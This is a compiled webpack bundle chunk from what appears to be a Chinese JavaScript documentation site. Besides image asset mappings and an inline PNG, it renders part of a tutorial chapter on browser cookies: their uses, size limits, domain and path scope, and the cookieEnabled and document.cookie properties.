(window.webpackJsonp=window.webpackJsonp||[]).push([[5],{251:function(s,t,e){s.exports=e.p+"assets/img/1550715805092-1553325280403.ede95b4d.png"},252:function(s,t,e){s.exports=e.p+"assets/img/1550715695394-1553325297231.79559769.png"},253:function(s,t,e){s.exports=e.p+"assets/img/1550715834037-1553325311016.427a3e82.png"},254:function(s,t,e){s.exports=e.p+"assets/img/1550715854650-1553325326587.95849431.png"},255:function(s,t,e){s.exports=e.p+"assets/img/1550715877585-1553325343238.d128367a.png"},256:function(s,t,e){s.exports=e.p+"assets/img/1550715998056-1553325358646.2a06e0b3.png"},257:function(s,t,e){s.exports=e.p+"assets/img/1550716026560-1553325371829.85658e20.png"},258:function(s,t,e){s.exports=e.p+"assets/img/1550717040205-1553325385819.a12958fa.png"},259:function(s,t,e){s.exports=e.p+"assets/img/1550717326882-1553325399932.8badb883.png"},260:function(s,t,e){s.exports=e.p+"assets/img/1550717525173-1553325412893.85b15b8d.png"},261:function(s,t,e){s.exports=e.p+"assets/img/1550718010509-1553325425301.e9d33c80.png"},262:function(s,t,e){s.exports=e.p+"assets/img/1550718521440-1553325438148.031a7ead.png"},263:function(s,t){s.exports="data:image/png;base64,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"},264:function(s,t,e){s.exports=e.p+"assets/img/4-1553325560473-1553325562016.a63eac22.png"},312:function(s,t,e){"use strict";e.r(t);var a=[function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("div",{staticClass:"content"},[a("h1",{attrs:{id:"第11章-会话保持"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第11章-会话保持","aria-hidden":"true"}},[s._v("#")]),s._v(" 第11章 会话保持")]),s._v(" "),a("h2",{attrs:{id:"概述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#概述","aria-hidden":"true"}},[s._v("#")]),s._v(" 概述")]),s._v(" "),a("p",[s._v("Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。")]),s._v(" "),a("p",[s._v("Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。")]),s._v(" "),a("ul",[a("li",[s._v("对话（session）管理：保存登录、购物车等需要记录的信息。")]),s._v(" "),a("li",[s._v("个性化：保存用户的偏好，比如网页的字体大小、背景色等等。")]),s._v(" "),a("li",[s._v("追踪：记录和分析用户行为。")])]),s._v(" "),a("p",[s._v("有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。")]),s._v(" "),a("p",[s._v("Cookie 包含以下几方面的信息。")]),s._v(" "),a("ul",[a("li",[s._v("Cookie 的名字")]),s._v(" "),a("li",[s._v("Cookie 的值（真正的数据写在这里面）")]),s._v(" "),a("li",[s._v("到期时间")]),s._v(" "),a("li",[s._v("所属域名（默认是当前域名）")]),s._v(" "),a("li",[s._v("生效的路径（默认是当前网址）")])]),s._v(" "),a("p",[s._v("举例来说，用户访问网址"),a("code",[s._v("www.example.com")]),s._v("，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含"),a("code",[s._v("www.example.com")]),s._v("这个域名，以及根路径"),a("code",[s._v("/")]),s._v("。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为"),a("code",[s._v("/forums")]),s._v("，那么这个 Cookie 只有在访问"),a("code",[s._v("www.example.com/forums")]),s._v("及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。")]),s._v(" "),a("p",[s._v("浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。"),a("code",[s._v("window.navigator.cookieEnabled")]),s._v("属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true\n")])])]),a("p",[a("code",[s._v("document.cookie")]),s._v("属性返回当前网页的 Cookie。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("// 当前网页的 Cookie\ndocument.cookie\n")])])]),a("p",[s._v("不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。")]),s._v(" "),a("p",[s._v("浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，"),a("code",[s._v("http://example.com")]),s._v("设置的 Cookie，可以被"),a("code",[s._v("https://example.com")]),s._v("读取。")]),s._v(" "),a("h2",{attrs:{id:"cookie-与-http-协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-与-http-协议","aria-hidden":"true"}},[s._v("#")]),s._v(" 